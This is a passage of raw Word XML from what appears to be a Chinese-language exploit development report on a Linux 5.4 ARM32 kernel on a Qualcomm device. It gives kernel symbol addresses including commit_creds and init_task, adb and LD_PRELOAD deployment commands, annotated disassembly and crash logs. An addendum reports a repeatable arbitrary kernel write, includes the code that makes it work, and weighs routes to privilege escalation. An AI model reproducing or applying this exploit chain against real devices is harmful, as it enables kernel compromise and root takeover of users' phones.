              <w:t>target.h</w:t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 xml:space="preserve"> 烘焙 OFF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2296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校验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commit_creds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c0148c60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0x00140c60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prepare_kernel_cred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c0148fe4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0x00140fe4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init_task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c1a112c0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0x01a092c0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✅（与日志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init_task=c1a112c0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一致）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rt_mutex_adjust_pi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c0196ba4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反汇编核对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rt_mutex_adjust_prio_chain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c0196c4c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✅（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LR=c0196d6c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= +0x120）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rt_mutex_enqueue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c0197ae8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全量反汇编核对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sys_clock_adjtime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c01d34a4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帧深度 248，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ktx @ sp+0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futex_requeue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futex_lock_pi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c01dd944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c01de400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0x001d5944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0x001d6400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_raw_spin_trylock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c0faea20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Oops PC 核对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ashmem_misc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c1aa8808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0x01aa0808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✅ → hijack 槽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c1aa8810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ashmem_fops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c13ae0c8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0x013a60c8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✅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misc_fops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c136d910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参考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sysctl_optmem_max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c1a08a04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0x01a00a04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✅（旧注释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c1a08934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作废）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console_printk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c1a1d174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0x01a15174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✅（旧注释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c1a1d0ac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作废）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wake_up_process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c01537f0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设计为不可达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实测结构偏移更正：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task-&gt;pi_lock = 0x6b4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task-&gt;pi_blocked_on = 0x6c8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（旧 ARM64 推导 0x570/0x584 作废）。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附录 B：复现环境与命令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# 交叉编译（Windows 侧 NDK r29，Git Bash）</w:t>
        <w:br/>
        <w:t>bash build_arm32.sh            # → exploit/preload.so（当前 419788 字节）</w:t>
        <w:br/>
        <w:br/>
        <w:t># 部署（必须设置 MSYS_NO_PATHCONV，否则远端路径被改写）</w:t>
        <w:br/>
        <w:t>export MSYS_NO_PATHCONV=1</w:t>
        <w:br/>
        <w:t>/c/platform-tools/adb.exe push exploit/preload.so /data/local/tmp/preload.so</w:t>
        <w:br/>
        <w:t>/c/platform-tools/adb.exe shell md5sum /data/local/tmp/preload.so   # 与本地一致</w:t>
        <w:br/>
        <w:br/>
        <w:t># 设备侧启动器 /data/local/tmp/fire.sh</w:t>
        <w:br/>
        <w:t>export LD_PRELOAD=/data/local/tmp/preload.so</w:t>
        <w:br/>
        <w:t>exec /system/bin/toybox true</w:t>
        <w:br/>
        <w:br/>
        <w:t># 受控单发 + 分类采集（pstore pre/post、optmem 前后、日志摘要）</w:t>
        <w:br/>
        <w:t>bash atd_fire.sh &lt;label&gt; &lt;ENV...&gt;</w:t>
        <w:br/>
        <w:t># 例：指纹实验（本报告 §7 的数据来源；日志中该 fire 显示 wbase=0、pattern 生效）</w:t>
        <w:br/>
        <w:t>bash atd_fire.sh wspat GHOSTLOCK_PATTERN=1 GHOSTLOCK_WBASE=0 GHOSTLOCK_ATTEMPTS=1</w:t>
        <w:br/>
        <w:t># 例：写目标自瞄（§9.2 的 wsself 组）</w:t>
        <w:br/>
        <w:t>bash atd_fire.sh wsself GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_WS_TARGET=self GHOSTLOCK_WS_PHASES=1 \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     GHOSTLOCK_WBASE=4 GHOSTLOCK_ATTEMPTS=1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环境变量表（与本实验相关）：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变量</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4592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含义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GHOSTLOCK_WBASE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植字基址偏移（实测正确值 = 4）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GHOSTLOCK_WALKSAFE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启用安全页植字（owner=0、prio=0、pi_tree 清零）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GHOSTLOCK_WS_TARGET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self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oracle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三选一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GHOSTLOCK_WS_PHASES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阶段数（1 = 只验证单次写；2 = 写 + 归零 owner）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GHOSTLOCK_PATTERN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指纹探针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buf[w] = 0x100 + 4w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GHOSTLOCK_ATTEMPTS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每次 fire 的 punch 次数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GHOSTLOCK_PUNCH_TID=-1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装而不发（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-ESRCH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，在任何 pi_lock 之前返回）——负对照组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GHOSTLOCK_PUNCH_TARGET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self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owner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waiter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判别组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GHOSTLOCK_PRIO_FILL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GHOSTLOCK_PRIO_PLANT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窗口/按基址 bail 二值探针（非破坏性）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GHOSTLOCK_PAGE_POISON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§10 的毒字阶梯（偏移,值）——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待实现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/>
                <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>`GHOSTLOCK_STACK_PAD`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已作废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：用户态 alloca 不影响内核帧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附录 C：关键反汇编片段（A.142，实测）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以下全部由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python exploit/tools/armimg.py dis &lt;addr&gt; &lt;n&gt;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（capstone，镜像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ota-research/extracted_a142/Image.a142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，BASE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0xC0008000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）在设备自有内核镜像上直接反汇编取得，非主线源码推断。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; ---- rt_mutex_adjust_prio_chain（c0196c4c，尺寸 0x558）：+0xC8 .. +0x25C ----</w:t>
        <w:br/>
        <w:t>c0196d14  ldr  r1, [r4, #0x34]        ; task-&gt;prio</w:t>
        <w:br/>
        <w:t>c0196d18  ldr  r0, [r6, #0x20]        ; waiter-&gt;prio</w:t>
        <w:br/>
        <w:t>c0196d1c  cmp  r0, r1</w:t>
        <w:br/>
        <w:t>c0196d20  bne  #0xc0196d64            ; 不等 =&gt; 继续走链（我方植 prio=0 必走此支）</w:t>
        <w:br/>
        <w:t>...</w:t>
        <w:br/>
        <w:t>c0196d64  mov  r0, r5                 ; r0 = waiter-&gt;lock</w:t>
        <w:br/>
        <w:t>c0196d68  bl   #0xc0faea20            ; _raw_spin_trylock</w:t>
        <w:br/>
        <w:t>c0196d6c  cmp  r0, #0</w:t>
        <w:br/>
        <w:t>c0196d70  bne  #0xc0196d94            ; 成功 =&gt; 正常路径</w:t>
        <w:br/>
        <w:t>c0196d74  mov  r0, r7                 ; ---- 失败分支（死循环风险）----</w:t>
        <w:br/>
        <w:t>c0196d78  bl   #0xc0faed30            ;   _raw_spin_unlock_irq(&amp;task-&gt;pi_lock)</w:t>
        <w:br/>
        <w:t>c0196d7c  mov  r0, r7</w:t>
        <w:br/>
        <w:t>c0196d80  bl   #0xc0faebd4            ;   _raw_spin_lock_irq(&amp;task-&gt;pi_lock)</w:t>
        <w:br/>
        <w:t>c0196d84  ldr  r6, [r4, #0x6c8]       ;   waiter = task-&gt;pi_blocked_on  (0x6c8 实测)</w:t>
        <w:br/>
        <w:t>c0196d88  cmp  r6, #0</w:t>
        <w:br/>
        <w:t>c0196d8c  bne  #0xc0196cb4            ;   goto retry  —— 无退避、无超时</w:t>
        <w:br/>
        <w:t>c0196d90  b    #0xc0197118</w:t>
        <w:br/>
        <w:t>c0196d94  ldr  r0, [sp, #8]           ; orig_lock (NULL)</w:t>
        <w:br/>
        <w:t>c0196d98  ldr  sl, [sp, #0x34]        ; top_task</w:t>
        <w:br/>
        <w:t>c0196d9c  cmp  r5, r0</w:t>
        <w:br/>
        <w:t>c0196da0  ldrne r0, [r5, #0xc]        ; next_lock-&gt;owner</w:t>
        <w:br/>
        <w:t>c0196da4  bicne r0, r0, #1            ; 去掉 tag 位</w:t>
        <w:br/>
        <w:t>c0196da8  cmpne r0, sl</w:t>
        <w:br/>
        <w:t>c0196dac  beq  #0xc019710c            ;   EDEADLK</w:t>
        <w:br/>
        <w:t>c0196db0  tst  r8, #1                 ; requeue ?</w:t>
        <w:br/>
        <w:t>c0196db4  beq  #0xc0196dd8            ;   否 =&gt; 跳过 dequeue（r8=1 实测，故走"是"）</w:t>
        <w:br/>
        <w:t>c0196db8  ldr  r0, [r5, #8]           ; top_waiter = lock-&gt;waiters.rb_leftmost</w:t>
        <w:br/>
        <w:t>c0196dbc  cmp  r0, #0</w:t>
        <w:br/>
        <w:t>c0196dc0  beq  #0xc0196e74            ;   树空 =&gt; sl=0</w:t>
        <w:br/>
        <w:t>c0196dc4  ldr  r1, [r0, #0x1c]        ; top_waiter-&gt;lock</w:t>
        <w:br/>
        <w:t>c0196dc8  mov  sl, r0                 ; prerequeue_top_waiter = top_waiter</w:t>
        <w:br/>
        <w:t>c0196dcc  cmp  r1, r5                 ; 厂商加固：必须等于 next_lock</w:t>
        <w:br/>
        <w:t>c0196dd0  beq  #0xc0196e78            ;   相等 =&gt; 安全；否则 b #0xc019718c（udf）</w:t>
        <w:br/>
        <w:t>c0196e78  ldr  r1, [r6]              ; RB_EMPTY_NODE: waiter-&gt;tree_entry.pc</w:t>
        <w:br/>
        <w:t>c0196e7c  cmp  r1, r6</w:t>
        <w:br/>
        <w:t>c0196e80  beq  #0xc0196ea4            ;   已自清 =&gt; 跳过 dequeue</w:t>
        <w:br/>
        <w:t>c0196e84  cmp  r0, r6                 ; top_waiter == waiter ?</w:t>
        <w:br/>
        <w:t>c0196e88  bne  #0xc0196e94</w:t>
        <w:br/>
        <w:t>c0196e8c  bl   #0xc0f9b468            ;   rb_next(waiter)</w:t>
        <w:br/>
        <w:t>c0196e90  str  r0, [r5, #8]           ;   更新 rb_leftmost</w:t>
        <w:br/>
        <w:t>c0196e94  add  r1, r5, #4             ; rb_erase_cached: root = &amp;lock-&gt;waiters.rb_root</w:t>
        <w:br/>
        <w:t>c0196e98  mov  r0, r6                 ;   node = waiter（栈上的幽灵！）</w:t>
        <w:br/>
        <w:t>c0196e9c  bl   #0xc0f9af3c            ;   ==&gt; rb_erase：唯一的 "写 where" 来源</w:t>
        <w:br/>
        <w:t>c0196ea0  str  r6, [r6]               ; RB_CLEAR_NODE（写 ghost+0 = ghost，无害）</w:t>
        <w:br/>
        <w:t>c0196ea4  ldr  r0, [r4, #0x34]        ; task-&gt;prio</w:t>
        <w:br/>
        <w:t>c0196ea8  str  r0, [r6, #0x20]        ; waiter-&gt;prio = task-&gt;prio（回写幽灵）</w:t>
        <w:br/>
        <w:br/>
        <w:t>; ---- _raw_spin_trylock（Oops PC 落点）----</w:t>
        <w:br/>
        <w:t>c0faea20  push {r4, lr}</w:t>
        <w:br/>
        <w:t>c0faea24  mov  r1, #4</w:t>
        <w:br/>
        <w:t>c0faea28  mov  r2, sp</w:t>
        <w:br/>
        <w:t>c0faea2c  bfi  r2, r1, #0, #0xd</w:t>
        <w:br/>
        <w:t>c0faea30  ldr  r1, [r2]</w:t>
        <w:br/>
        <w:t>c0faea34  add  r1, r1, #1</w:t>
        <w:br/>
        <w:t>c0faea38  str  r1, [r2]</w:t>
        <w:br/>
        <w:t>c0faea3c  pldw [r0]</w:t>
        <w:br/>
        <w:t>c0faea40  ldrex r2, [r0]              ; Oops #1 停在 +0x20；Oops #2 停在 +0x24（对齐陷阱）</w:t>
        <w:br/>
        <w:t>c0faea44  mov  r3, #0</w:t>
        <w:br/>
        <w:t>c0faea48  subs r1, r2, r2, ror #16</w:t>
        <w:br/>
        <w:t>c0faea4c  addeq r2, r2, #0x10000</w:t>
        <w:br/>
        <w:t>c0faea50  strexeq r3, r2, [r0]</w:t>
        <w:br/>
        <w:t>c0faea54  cmp  r3, #0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附录 D：完整 ramoops 摘录（§7.2 指纹实验，逐字节原样）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&lt;1&gt;[  827.728846] 8&lt;--- cut here ---</w:t>
        <w:br/>
        <w:t>&lt;1&gt;[  827.728855] Unable to handle kernel NULL pointer dereference at virtual address 0000012c</w:t>
        <w:br/>
        <w:t>&lt;1&gt;[  827.728860] pgd = 3682de94</w:t>
        <w:br/>
        <w:t>&lt;1&gt;[  827.728863] [0000012c] *pgd=00000000</w:t>
        <w:br/>
        <w:t>&lt;0&gt;[  827.728871] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728915] CPU: 1 PID: 8370 Comm: toybox Tainted: G        W  O      5.4.134-perf-00522-gb29f81177a79 #1</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728918] Hardware name: Qualcomm Technologies, Inc. MONACO (Flattened Device Tree)</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728928] PC is at _raw_spin_trylock+0x20/0x90</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728935] LR is at rt_mutex_adjust_prio_chain+0x120/0x558</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728939] pc : [&lt;c0faea40&gt;]    lr : [&lt;c0196d6c&gt;]    psr: 20010093</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728942] sp : c7c15e90  ip : 000f000f  fp : 00000000</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728945] r10: 00000000  r9 : 00000000  r8 : 00000001</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728949] r7 : e1ff96b4  r6 : c7e19ec0  r5 : 0000012c  r4 : e1ff9000</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728953] r3 : 00000000  r2 : c7c14004  r1 : 00000003  r0 : 0000012c</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728958] Flags: nzCv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment none</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728962] Control: 10c0383d  Table: 44d5c06a  DAC: 00000051</w:t>
        <w:br/>
        <w:t>&lt;0&gt;[  827.728966] Process toybox (pid: 8370, stack limit = 0x3c6012cd)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寄存器直读：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r4 = task = 0xe1ff9000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；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r7 = task + 0x6b4 = &amp;task-&gt;pi_lock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；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r6 = waiter = 0xc7e19ec0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（= 该线程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stack_top − 0x140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）；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r5 = waiter-&gt;lock = 0x12c = buf[11]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（指纹值）；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r8 = 1 = requeue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附录 E：单次成功 fire 的时间线（实测，walksafe 阶段）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t+0.00s  preload 启动，uid=2000 / SELinux shell 域确认</w:t>
        <w:br/>
        <w:t>t+0.33s  KernelSnitch 参数（cpu 8, mm 0x200, order 0）</w:t>
        <w:br/>
        <w:t>t+0.83s  哈希碰撞发现（3 处）</w:t>
        <w:br/>
        <w:t>t+2.57s  mm_struct 泄露命中（model=1 hsz=256）→ PREP 页就绪</w:t>
        <w:br/>
        <w:t>t+2.71s  CONSUMER-START（线程绑核成功与否记录 pin_rc/pin_errno）</w:t>
        <w:br/>
        <w:t>t+2.81s  REQUEUE-PI ret=-1 errno=35 → 幽灵 waiter 成形</w:t>
        <w:br/>
        <w:t>t+10.7s  TARGET-PRE（punch 目标 prio=120）</w:t>
        <w:br/>
        <w:t>t+10.75s WS ph=0 植字（W/V/page/lock/fops 全部打印，供事后核对）</w:t>
        <w:br/>
        <w:t>t+10.76s PRE-ATDFI（buf[4..12] 内容逐字打印）</w:t>
        <w:br/>
        <w:t>t+10.77s PUNCH-TGT → 此后进入走链（当前在此挂死）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t+2.81 → t+10.7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的约 8 s 间隔正是 §9.3 假说关注的"页可能失主"窗口，也是下一步实验要压缩的对象。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color w:val="1F3B63"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>追加章节（2026-10-16）：任意写落地、可重复化，以及一条被证明走不通的路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本报告正文写于 2026-10-14，当时的判断（"走链挂死、根因疑为页回收"）在随后的实验中被</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>部分推翻、部分精化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。以下追加内容为最新实测结论，正文中与之冲突之处以本追加章节为准。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A1 任意写原语已在实机落地并可重复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实验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配置</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3061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结果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wdt1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WS_DATA=1 WS_TARGET=oracle WBASE=4 ATTEMPTS=1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optmem_max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读回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0xc1d511d4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（= 我们指定的值），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verdict=EXACT-HIT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设备存活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，punch 23 µs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wdt2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同上 +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WS_PUNCHES=400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第 2 次 punch 死在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rb_insert_color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LR=rt_mutex_adjust_prio_chain+0x278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r1=c1d510d8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=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L+4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wdt3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同上 + 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假树旋转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calls=16 success=16 avg_usec=10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EXACT-HIT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，</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
                <w:strike w:val="0"/>
                <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>设备存活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⇒ 每次开机可下 64 次任意写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关键设计：把走链要解引用的结构从"回收页"搬到编译期已知的零 .bss 缓冲区。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/* target.h */</w:t>
        <w:br/>
        <w:t>#define DBGFS_TX_CMD_BUF_OFF 0x01d48fd4UL          /* c1d50fd4, 'b', 恰好 0x1000 字节 */</w:t>
        <w:br/>
        <w:t>#define DBGFS_TX_CMD_BUF     (KIMAGE_TEXT_BASE + DBGFS_TX_CMD_BUF_OFF)</w:t>
        <w:br/>
        <w:t>#define FAKE_LOCK_DATA_OFF   0x100                 /* 假 rt_mutex */</w:t>
        <w:br/>
        <w:t>#define FAKE_ABSORB_DATA_OFF 0x200                 /* 吸收 *(V)=W-4 的槽位 */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选它的理由：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dbgfs_tx_cmd_buf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.bss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（启动即为全 0 ✓）、下一个符号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dsi_display_primary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正好在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+0x1000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（大小确定 ✓）、只有 root 才能碰的 DSI debugfs store 处理函数会写它（shell 无法干扰 ✓）、且</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>地址是编译期常量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（无 KASLR ✓）。这样走链解引用的每一个地址都是常量，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>对"页回收成功"的依赖被彻底删除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wdt2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的崩溃也顺带证明了为什么必须旋转：第 1 次 punch 之后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L-&gt;waiters.rb_node/rb_leftmost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仍指向栈上的幽灵，第 2 次 punch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rt_mutex_enqueue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会顺着这条陈旧链走。修法是每次 punch 前把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adjbuf[wbase+WT_W_LOCK]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推进 16 字节，取一块全新的零假树：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if (ws &amp;&amp; ws_data_mode()) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  unsigned int n = (unsigned)atomic_load(&amp;consumer_success) &amp; 63u;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  adjbuf[wbase + WT_W_LOCK] = (uint32_t)(ws_lock_addr() + (uintptr_t)(n * 0x10));</w:t>
        <w:br/>
        <w:t>}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这只是对用户态缓冲区做一次普通 store，不引入任何系统调用，所以"植物新鲜度"仍然由每 ~0.3 µs 一次的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copy_from_user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保证。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A2 正文 §9.3 的"页回收"假说：真正的原因更基础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正文猜测是"PREP 与 punch 之间 8 s 内页被回收"。实测把这条推进了两步：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`wr1` 指纹实验证明栈上的植物是活的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：故意把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植成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fake_lock+1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（未对齐），内核立刻死在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_raw_spin_trylock+0x24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r0 = c6903701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= 我们写进去的值，调用链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sys_sched_setattr → __sched_setscheduler → rt_mutex_adjust_pi → rt_mutex_adjust_prio_chain → _raw_spin_trylock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完整可见。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>几何与植物活性从此不再是疑问。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`wspo7` 给出了决定性证据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：崩溃是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`Unable to handle kernel paging request at virtual address d1a2c700`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（页根本不存在），而不是内容错误。查设备自身启动 dmesg（保存在 pstore）发现：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lowmem  0xc0000000-0xc5a00000 (90 MB)   vmalloc 0xc5a00000-0xc5f10000 (5 MB)</w:t>
        <w:br/>
        <w:t>lowmem  0xc5f10000-0xc5fff000           lowmem  0xc6300000-0xcab00000 (72 MB)</w:t>
        <w:br/>
        <w:t>vmalloc 0xcab00000-0xcfb00000 (80 MB)   lowmem  0xcfb00000-0xd0900000 (14 MB)</w:t>
        <w:br/>
        <w:t>vmalloc 0xd0900000-0xd2717000 (30 MB)   lowmem  0xd2717000-0xe0000000 (216 MB)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这台机器的低段直接映射被设备树空洞切成多段，vmalloc 夹在中间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；而 KernelSnitch 的扫描范围写的是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0xC0000000-0xF0000000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，于是会把 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>vmalloc 空洞里的地址当成 mm 页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返回。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d1a2c000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d2cd7000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等"命中"全都落在空洞里。已加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__ks_addr_is_lowmem()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白名单修掉。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修好之后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wpg2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（lock 指回页内 + oracle + 毒字）表现为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>既不 fault 也不写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——即走链是从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rb_erase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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>双孩子分支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出去的，页里是别人的指针。结论：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回收页路线不仅无效，而且有害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（它会写无关的 .data），停止投入。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A3 被证明的一条硬限制：这个原语永远无法安装代码指针</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80" w:line="324" w:lineRule="auto"/>
      </w:pP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rb_erase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的单孩子分支产生两处写：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*(W) = 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*(V) = W−4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。第二处把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当地址解引用，所以 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>V 必须指向可写内存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；而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V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正是写进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的值。于是：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40" w:line="324" w:lineRule="auto"/>
        <w:ind w:left="340"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>该原语能存储的值只有两类：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20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19"/>
        </w:rPr>
        <w:t>tree_r=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> 走"无孩子"分支）或</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>一个可写内核地址</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>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再叠加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CONFIG_STRICT_KERNEL_RWX=y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CONFIG_STRICT_MODULE_RWX=y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（模块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.text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加载后也是只读），</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>代码地址永远无法被写入任何位置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这条限制的直接后果：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假 `file_operations` 不能靠"写"拼出来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——表里至少要有一个函数指针，而函数指针指向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.text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。它只能来自"内容完全由我们 spray、且地址已知"的内存页。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为确认没有漏网之鱼，做了离线穷举（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exploit/tools/fopsscan.py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）：以链接器自身的段符号界定可写区（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_sdata=0xc1a00000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_edata/__bss_start=0xc1b1d080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__bss_stop=0xc1d5a734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；注意 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>kallsyms 的类型字符不可信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__start_rodata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自己就被标成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），再用"slot+0x04 必须是已知的 llseek 实现"过滤掉一切函数指针数组。结果：可写区里 31 张表，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>全是 `struct proto` / `proto_ops` / `ion heap_ops` / `regmap_bus` / `pernet_operations`，没有一张是 `file_operations`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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120" w:before="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="227"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>raw_prot @ c1af5e34          +0x28 = raw_getsockopt</w:t>
        <w:br/>
        <w:t>msm_system_heap_ops @ c1aa873c</w:t>
        <w:br/>
        <w:t>ipv4_mib_ops @ c1af6b10      +0x28 = igmp_net_init</w:t>
        <w:br/>
        <w:t>af_inet_ops @ c1af6af0       +0x08 = inet_init_net</w:t>
        <w:br/>
        <w:t>clk_alpha_pll_regmap_ops @ c1a569e4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misc-&gt;fops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指向这些表会以错误的参数布局调用内核函数（r0=file 被当成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struct sock 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ion_heap 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net *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），几乎必然崩溃且不产生任何能力 ⇒ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>路线 (a) 关闭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A4 其它已排除的捷径（都做过实测，别再试）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想法</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4592"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8EEF7"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
                <w:strike w:val="0"/>
                <w:rFonts w:eastAsia="黑体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>结论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/proc/self/pagemap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取物理帧 → 用直接映射别名当可控页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✗ 返回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present=1 pfn=0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，5.4 起 PFN 需要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CAP_SYS_ADMIN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把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misc-&gt;fops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指向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memory_fops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走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/dev/mem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✗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# CONFIG_DEVMEM is not set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；且 dump Image 里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memory_fops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的初始化值确认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+0x08 read=0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+0x0c write=0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，只有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+0x38 open=memory_open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用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modprobe_path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core_pattern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字符串劫持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✗ 需要写入 ASCII 字节，而可写的值只能是 0 或可写地址（见 A3）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写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init_task.cred = 假 cred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让 init 的子进程提权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✗ 我们的 shell 是 adbd 的子进程，不继承 init 的 cred；且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cap_*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需要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0xFFFFFFFF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这种非可写地址值</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr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借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ashmem_fops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kgsl_fops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 等现成表做类型混淆</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4592"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:sz w:val="17"/>
              </w:rPr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 xml:space="preserve">✗ 它们都在 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.rodata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trike w:val="0"/>
                <w:color w:val="8B1C1C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>__start_rodata=c0fb0000..__end_rodata=c1825000</w:t>
